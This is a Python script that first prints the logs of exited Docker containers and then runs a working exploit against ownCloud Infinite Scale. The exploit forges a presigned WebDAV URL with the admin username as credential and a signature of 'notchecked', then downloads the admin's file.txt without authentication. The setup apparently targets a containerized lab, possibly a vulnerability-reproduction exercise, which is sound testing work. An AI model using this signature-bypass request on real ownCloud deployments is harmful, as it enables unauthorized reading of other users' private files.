import subprocess

# Function to run a shell command and return its output
def run_command(command):
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    return result.stdout.strip()

# Step 1: Get the IDs of all exited containers
command = "docker ps -f status=exited --format '{{.ID}}'"
exited_containers = run_command(command).splitlines()

if exited_containers:
    print("Exited containers found:")
    for container_id in exited_containers:
        print(f"\nLogs for container ID: {container_id}")
        
        # Step 2: Get logs for each exited container
        log_command = f"docker logs {container_id}"
        logs = subprocess.check_output(["docker", "logs", container_id]).decode("utf-8")
        
        print(logs)
else:
    print("No exited containers found.")


import requests
import time

OCIS_URL = "ocis-app:9200"
USERNAME = "admin"
FILE = "file.txt"
EXPLOIT_URL_TEMPLATE = "https://{}/remote.php/dav/files/{}/{}?OC-Credential={}&OC-Verb=GET&OC-Expires=60&OC-Date=2024-01-27T00:00:00.000Z&OC-Signature=notchecked"
EXPLOIT_URL = EXPLOIT_URL_TEMPLATE.format(OCIS_URL, USERNAME, FILE, USERNAME)
RETRIES = 5

response: requests.Response = None

for _ in range(RETRIES):
    try:
        response = requests.get(EXPLOIT_URL, verify=False)
        break
    except requests.exceptions.ConnectionError as e:
        if _ == RETRIES - 1:
            raise(e)
        print("Connection error, retrying in 5 seconds")
        time.sleep(5)

if response.status_code == 200:
    print(response.text)
else:
    print(f"Failed to download file: {response.status_code}")
